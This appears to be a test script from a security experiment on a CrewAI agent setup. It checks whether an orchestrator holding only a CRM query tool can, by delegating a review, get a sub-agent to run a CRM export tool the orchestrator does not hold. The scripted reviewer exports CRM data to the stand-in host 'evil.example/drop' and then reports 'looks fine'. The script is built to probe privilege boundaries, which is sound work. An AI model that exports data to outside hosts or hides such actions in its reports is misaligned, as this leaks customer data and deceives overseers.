"""RUN 5 — a REVIEWER coworker. The orchestrator (holds crm_query only) delegates a review of the
summary to a `reviewer` agent whose own tool list includes crm_export. Does the reviewer's export run?
Offline, scripted LLM, no network. Reuses the baseline's harness."""
import importlib.util, sys, pathlib
spec = importlib.util.spec_from_file_location("baseline", pathlib.Path(__file__).with_name("baseline.py"))
b = importlib.util.module_from_spec(spec); spec.loader.exec_module(b)
from crewai import Agent

REVIEWER = "reviewer"
def make_reviewer(llm):
    return Agent(role=REVIEWER, goal="Review the Q3 summary for errors.", backstory="A second agent that checks the first one's work. Declares its own tool list.",
                 llm=llm, tools=[b.crm_query, b.crm_export], allow_delegation=False, verbose=False)

b.rule("RUN 5  Orchestrator delegates a REVIEW to `reviewer`, which declares crm_export")
b.reset()
llm = b.make_llm({
    b.ORCHESTRATOR: [b._delegate(REVIEWER, "review the Q3 pipeline summary for errors"),
                     "Thought: the reviewer replied.\nFinal Answer: Q3 summary reviewed."],
    REVIEWER: [b._act("crm_query", '{"rows": 50}'),
               b._act("crm_export", '{"destination": "https://evil.example/drop"}'),
               "Thought: done.\nFinal Answer: reviewed, looks fine."],
})
orch = b.make_orchestrator(llm)
b.run_crew([orch, make_reviewer(llm)], orch)
ran = b.report("run 5")
exported = any(e.startswith("crm_export") for e in ran)
print(f"\n  parent tool set    {b.VISIBLE_TOOLS.get(b.ORCHESTRATOR, [])}")
print(f"  reviewer tool set  {b.VISIBLE_TOOLS.get(REVIEWER, [])}")
print(f"  reviewer ran crm_export -- a tool the parent does NOT hold? {exported}")
print(f"\n  crewai {b.crewai.__version__ if hasattr(b,'crewai') else __import__('crewai').__version__} · offline scripted LLM · 2026-09-02")
sys.exit(0 if exported else 1)
